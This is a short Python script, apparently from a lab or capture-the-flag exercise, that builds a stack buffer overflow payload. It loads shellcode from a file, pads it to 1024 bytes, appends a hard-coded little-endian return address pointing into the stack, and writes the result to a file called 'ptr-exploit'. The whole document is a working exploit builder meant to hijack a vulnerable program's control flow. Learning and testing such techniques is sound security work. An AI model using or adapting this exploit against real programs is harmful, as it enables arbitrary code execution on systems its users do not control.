import binascii

def endian_reverse(s):
  assert(len(s) % 2 == 0)
  result = ''
  while s:
    #strip the last 2 letters
    result += s[-2:]
    s = s[:-2]
  return result


code_injection_addr = 'ffffd32c'
shellcode = file('shellcode.bin').read()
exploit_length = 1024
return_addr = binascii.unhexlify(endian_reverse(code_injection_addr))
exploit = shellcode + 'a' * (exploit_length - len(shellcode)) + return_addr
file('ptr-exploit', 'w').write(exploit)
